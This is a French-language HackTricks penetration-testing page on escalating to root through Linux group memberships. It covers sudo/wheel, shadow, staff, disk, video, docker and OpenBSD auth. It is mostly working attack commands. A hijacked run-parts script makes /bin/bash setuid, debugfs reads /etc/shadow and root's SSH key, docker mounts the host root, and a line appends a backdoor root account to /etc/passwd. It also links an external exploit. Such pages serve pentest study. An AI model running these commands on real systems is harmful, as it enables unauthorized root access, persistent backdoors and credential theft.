# Groupes intéressants - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Groupes Sudo/Admin

### **PE - Method 1**

**Parfois**, **par défaut (ou parce que certains logiciels en ont besoin)** dans le fichier **/etc/sudoers** vous pouvez trouver certaines de ces lignes:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Cela signifie que **n'importe quel utilisateur appartenant au groupe sudo ou admin peut exécuter n'importe quoi avec sudo**.

Si c'est le cas, pour **devenir root vous pouvez simplement exécuter** :
```
sudo su
```
### PE - Méthode 2

Trouver tous les binaires suid et vérifier s'il existe le binaire **Pkexec** :
```bash
find / -perm -4000 2>/dev/null
```
Si vous constatez que le binaire **pkexec is a SUID binary** et que vous appartenez aux groupes **sudo** ou **admin**, vous pouvez probablement exécuter des binaires en tant que sudo en utilisant `pkexec`.\
C'est parce que typiquement ce sont ces groupes qui figurent dans la **polkit policy**. Cette policy identifie essentiellement quels groupes peuvent utiliser `pkexec`. Vérifiez-le avec:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Là, vous trouverez quels groupes sont autorisés à exécuter **pkexec** et, **par défaut**, dans certaines distributions Linux les groupes **sudo** et **admin** apparaissent.

Pour **devenir root vous pouvez exécuter** :
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Si vous essayez d'exécuter **pkexec** et que vous obtenez cette **erreur** :
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Ce n'est pas parce que vous n'avez pas les permissions mais parce que vous n'êtes pas connecté via une GUI**. Et il existe un contournement pour ce problème ici : [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Vous avez besoin de **2 sessions ssh différentes** :
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**Parfois**, **par défaut**, dans le fichier **/etc/sudoers** vous pouvez trouver cette ligne :
```
%wheel	ALL=(ALL:ALL) ALL
```
Cela signifie que **tout utilisateur appartenant au groupe wheel peut exécuter n'importe quoi avec sudo**.

Si c'est le cas, pour **devenir root vous pouvez simplement exécuter** :
```
sudo su
```
## Groupe shadow

Les utilisateurs appartenant au **group shadow** peuvent **lire** le fichier **/etc/shadow** :
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Donc, lis le fichier et essaie de **crack some hashes**.

Petite nuance sur l'état de verrouillage lors du tri des hashes :
- Les entrées contenant `!` ou `*` sont généralement non interactives pour les connexions par mot de passe.
- `!hash` signifie généralement qu'un mot de passe a été défini puis verrouillé.
- `*` signifie généralement qu'aucun hash de mot de passe valide n'a jamais été défini.
Ceci est utile pour la classification des comptes même lorsque la connexion directe est bloquée.

## Groupe staff

**staff** : Permet aux utilisateurs d'ajouter des modifications locales au système (`/usr/local`) sans nécessiter de privilèges root (notez que les exécutables dans `/usr/local/bin` figurent dans la variable PATH de tout utilisateur, et ils peuvent "override" les exécutables dans `/bin` et `/usr/bin` portant le même nom). Comparez avec le groupe "adm", qui est plus lié à la surveillance/sécurité. [\[source\]](https://wiki.debian.org/SystemGroups)

Dans les distributions Debian, la variable `$PATH` montre que `/usr/local/` sera consulté en priorité, que vous soyez un utilisateur privilégié ou non.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Si nous pouvons détourner certains programmes dans `/usr/local`, nous pouvons facilement obtenir root.

Détourner le programme `run-parts` est un moyen simple d'obtenir root, car la plupart des programmes exécutent `run-parts` (par exemple crontab, lors d'une connexion ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
ou lors de la connexion d'une nouvelle session ssh.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Groupe disk

Ce privilège est presque **équivalent à un accès root**, car il permet d'accéder à toutes les données de la machine.

Fichiers:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Notez que, en utilisant debugfs, vous pouvez aussi **écrire des fichiers**. Par exemple, pour copier `/tmp/asd1.txt` vers `/tmp/asd2.txt`, vous pouvez faire :
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Cependant, si vous essayez d'**écrire des fichiers appartenant à root** (comme `/etc/shadow` ou `/etc/passwd`) vous aurez une erreur "**Permission denied**".

## Groupe vidéo

En utilisant la commande `w`, vous pouvez trouver **qui est connecté au système** et elle affichera une sortie comme la suivante :
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Le **tty1** signifie que l'utilisateur **yossi est connecté physiquement** à un terminal sur la machine.

Le **video group** a accès pour visualiser la sortie de l'écran. En gros, vous pouvez observer les écrans. Pour ce faire, vous devez **récupérer l'image courante à l'écran** sous forme brute et obtenir la résolution utilisée par l'écran. Les données de l'écran peuvent être sauvegardées dans `/dev/fb0` et vous pouvez trouver la résolution de cet écran dans `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Pour **ouvrir** l'**image brute** vous pouvez utiliser **GIMP**, sélectionner le fichier **`screen.raw`** et choisir comme type de fichier **Raw image data**:

![](<../../../images/image (463).png>)

Ensuite, modifiez les Width et Height pour correspondre à ceux utilisés à l'écran et testez différents Image Types (et sélectionnez celui qui affiche le mieux l'écran) :

![](<../../../images/image (317).png>)

## Groupe root

Il semble que par défaut les **membres du groupe root** pourraient avoir accès pour **modifier** certains fichiers de configuration de **service**, certains fichiers de **bibliothèques** ou **d'autres éléments intéressants** qui pourraient être utilisés pour escalader les privilèges...

**Vérifiez quels fichiers les membres du groupe root peuvent modifier**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Vous pouvez **monter le root filesystem de la host machine sur le volume d'une instance**, donc lorsque l'instance démarre, elle charge immédiatement un `chroot` dans ce volume. Cela vous donne effectivement root sur la machine.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Enfin, si aucune des suggestions précédentes ne vous convient, ou si elles ne fonctionnent pas pour une raison quelconque (pare-feu de l'API docker ?), vous pouvez toujours essayer d'**exécuter un conteneur privilégié et d'en échapper** comme expliqué ici :


{{#ref}}
../container-security/
{{#endref}}

Si vous avez les droits d'écriture sur le docker socket, lisez [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Groupe lxc/lxd


{{#ref}}
./
{{#endref}}

## Groupe Adm

Généralement, les **membres** du groupe **`adm`** ont les permissions de **lire les fichiers de log** situés dans _/var/log/_.\
Par conséquent, si vous avez compromis un utilisateur appartenant à ce groupe, vous devriez absolument jeter un **œil aux logs**.

## Groupes Backup / Operator / lp / Mail

Ces groupes sont souvent des vecteurs de **credential-discovery** plutôt que des vecteurs menant directement à root :
- **backup** : peut exposer des archives contenant des configs, clés, dumps de DB, ou tokens.
- **operator** : accès opérationnel spécifique à la plateforme qui peut leak des données sensibles d'exécution.
- **lp** : les files/spools d'impression peuvent contenir le contenu des documents.
- **mail** : les mail spools peuvent exposer des reset links, OTPs, et identifiants internes.

Considérez l'appartenance à ces groupes comme une découverte d'exposition de données à haute valeur et pivotez en exploitant la réutilisation de mots de passe/tokens.

## Groupe Auth

Sur OpenBSD, le groupe **auth** peut généralement écrire dans les dossiers _**/etc/skey**_ et _**/var/db/yubikey**_ s'ils sont utilisés.\
Ces permissions peuvent être abusées avec l'exploit suivant pour **escalate privileges** vers root : [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
